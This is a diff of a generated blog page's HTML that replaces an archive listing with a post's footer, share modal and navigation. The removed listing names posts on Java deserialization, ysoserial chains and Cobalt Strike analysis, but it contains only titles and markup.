+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/09/memshell%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/" class="archive-article-date">
-  	<time datetime="2021-05-27T07:35:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">记一次极端环境下不出网机器上线</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/">记一次极端环境下不出网机器上线</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">实战攻防</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
-  	<time datetime="2021-05-23T10:36:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/23/SpringMVC%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/">SpringMVC源码学习</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">java相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/" class="archive-article-date">
-  	<time datetime="2021-05-15T07:23:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/15/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2021-21350/">Xstream反序列化命令执行研究(CVE-2021-21350)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Xstream相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-weblogic">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2021-05-06T05:48:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/06/Jdk7u21%E6%96%B0%E9%93%BE-hw%E7%88%86%E5%87%BA/">Jdk7u21新链(hw爆出)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Weblogic相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/" class="archive-article-date">
-  	<time datetime="2021-05-02T04:09:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/">ysoserial学习之Jdk7u21</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ysoserial学习</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:21:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/">ysoserial学习之CommonsBeanutils1</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ysoserial学习</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/01/cobaltStrike%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:19:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/01/cobaltStrike%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/">cobaltStrike通信协议分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">C2相关</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/01/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2020-26217/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:17:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/01/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A0%94%E7%A9%B6-CVE-2020-26217/">Xstream反序列化命令执行研究-CVE-2020-26217</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java反序列化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/05/01/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF%E7%A0%94%E7%A9%B6-CVE-2020-26258/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:16:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/01/Xstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF%E7%A0%94%E7%A9%B6-CVE-2020-26258/">Xstream反序列化SSRF研究(CVE-2020-26258)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java反序列化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -574,8 +400,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
